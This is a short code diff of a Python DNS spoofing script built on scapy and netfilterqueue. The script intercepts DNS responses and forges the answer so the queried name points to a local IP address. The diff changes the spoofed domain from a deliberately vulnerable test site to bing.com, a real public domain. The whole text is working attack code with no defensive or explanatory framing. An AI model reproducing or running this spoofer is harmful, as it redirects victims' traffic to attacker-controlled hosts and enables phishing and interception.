@@ -5,7 +5,7 @@ def modify_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
-        if "testphp.vulnweb.com" in qname:
+        if "bing.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname,rdata="192.168.159.147")
             # Modifying the Scapy_packet
@@ -22,3 +22,4 @@ def modify_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0,modify_packet)
 queue.run()
+    
